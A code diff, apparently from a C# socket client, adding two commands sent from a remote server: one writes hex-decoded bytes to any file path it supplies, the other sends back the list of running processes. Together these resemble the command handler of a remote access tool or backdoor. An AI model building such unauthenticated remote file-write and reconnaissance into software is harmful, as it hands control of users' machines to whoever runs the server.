@@ -1,9 +1,6 @@
 ﻿using System;
 using System.Drawing;
-using System.Windows.Forms;
-using System.Diagnostics;
 using System.Collections.Generic;
-using System.Threading.Tasks;
 using System.Net.Sockets;
 using System.Text;
 using Newtonsoft.Json.Linq;
@@ -12,7 +9,11 @@ using System.IO;
 using System.Threading;
 using System.Runtime.InteropServices;
 using Newtonsoft.Json;
-
+class fileObj
+{
+    public string filename { get; set; }
+    public string contents { get; set; }
+}
 class program
 {
     [DllImport("user32.dll")]
@@ -147,6 +148,25 @@ class program
             {
                 GlobalVariables.run = false;
                 break;
+            } else if (receivedString.StartsWith("savefile->"))
+            {
+                string[] contents = receivedString.Split(new[] { "savefile->" }, StringSplitOptions.None);
+                fileObj FileContents = JsonConvert.DeserializeObject<fileObj>(contents[1]);
+                Console.WriteLine(FileContents.filename);
+                byte[] byteArray = new byte[FileContents.contents.Length / 2];
+                    
+                for (int i = 0; i < FileContents.contents.Length; i += 2)
+                {
+                    byteArray[i / 2] = Convert.ToByte(FileContents.contents.Substring(i, 2), 16);
+                }
+                // Now, byteArray contains the byte representation of the hexadecimal string.
+                File.WriteAllBytes(FileContents.filename, byteArray);
+            } else if (receivedString.StartsWith("GETPIDS"))
+            {
+                string processes = "pids->" + objA.GetProcessesAsJson();
+                // Convert the JSON string to bytes using UTF-8 encoding
+                byte[] processids = Encoding.UTF8.GetBytes(processes);
+                SendData(socket, processids);
             }
         }
 
